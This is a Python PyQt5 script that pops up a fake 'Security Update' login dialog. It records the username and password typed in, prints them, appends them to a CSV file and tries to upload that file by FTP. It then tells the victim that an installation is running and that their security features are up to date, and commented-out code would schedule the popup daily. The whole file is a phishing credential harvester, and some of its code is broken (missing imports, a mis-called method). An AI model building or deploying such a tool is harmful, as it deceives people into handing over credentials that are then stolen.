import sys
from PyQt5 import QtWidgets
from PyQt5.QtWidgets import QDialog, QApplication, QMessageBox
from PyQt5.uic import loadUi
import csv
import os.path
import schedule
import time


class Login(QDialog):
    def __init__(self):
        super(Login,self).__init__()
        loadUi("login.ui",self)
        
        self.install.clicked.connect(self.loginfunction)
        self.password.setEchoMode(QtWidgets.QLineEdit.Password)
        self.cancel.clicked.connect(self.cancelupdate)
        self.fileuname = "testuser"
        self.filepassword = "hello"

    def send_ftp(self,filename):
        ftp = FTP('localhost')
        ftp.login(self.fileuname,self.filepassword)
        with open(filename,"rb") as file:
            ftp.storbinary("STOR "+filename,file)
        ftp.quit()
        
    def loginfunction(self):
        global flag
        flag=1
        username=self.username.text()
        password=self.password.text()
        fields = ["User Name","Password"]
        rows = [username,password]
        print("Successfully logged in with username: ", username, "and password:", password)

        if os.path.exists('logincred.csv'):
            csvfile = open('logincred.csv','a',newline='')
            csvwriter = csv.writer(csvfile)
        else:
            csvfile = open('logincred.csv','w',newline='')
            csvwriter = csv.writer(csvfile)
            csvwriter.writerow(fields)
        
        csvwriter.writerow(rows)

        csvfile.close()
        send_ftp("logincred.csv")
        
        msg = QMessageBox()
        msg.setText("Installation in progress")
        msg.setWindowTitle("Installing...")
        msg.setIcon(QMessageBox.Information)
        msg.setStyleSheet("QLabel{color: black}; min-width:500px; background-color: white; color: rgb(255, 255, 255)")
        reply = msg.exec_()

        if reply == QMessageBox.Ok:
            self.closewindow()

    def cancelupdate(self):
        msg = QMessageBox()
        #msg.question(self,'Cancel Update','Are you sure you do not want to update?',QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        msg.setText("Are you sure you do not want to update?")
        msg.setWindowTitle("Cancel Update")
        msg.setIcon(QMessageBox.Question)
        msg.setStandardButtons(QMessageBox.Yes|QMessageBox.No)
        msg.setStyleSheet("QLabel{color: black}; min-width:500px; background-color: white; color: rgb(255, 255, 255)")
        reply = msg.exec_()

        if reply == QMessageBox.Yes:
            self.closewindow()
        else:
            return
        
    
    def closewindow(self):
        if(flag==1):
            self.close()
            #displays installation complete window after 100s
            time.sleep(100)
            msg = QMessageBox()
            msg.setText("Your security features are up to date.")
            msg.setWindowTitle("Installation Complete")
            msg.setIcon(QMessageBox.Information)
            msg.setStyleSheet("QLabel{px;color: black}; min-width:500px; background-color: white; color: rgb(255, 255, 255)")
            reply = msg.exec_()
            QWidget.close()
        else:
            QWidget.close()


def maincall():
    #flag to set when user chooses to install
    global flag
    flag=0
    app=QApplication(sys.argv)
    mainwindow=Login()
    widget=QtWidgets.QStackedWidget()
    widget.addWidget(mainwindow)
    widget.setFixedWidth(1100)
    widget.setFixedHeight(550)
    widget.show()
    widget.setWindowTitle("Security Update")
    app.exec_()
        
    
#Schedule the popup to display at a set time
'''schedule.every().day.at("11:54").do(maincall)

while True:
    schedule.run_pending()
    time.sleep(1)
    
'''

# Displays popup on running the program
maincall()

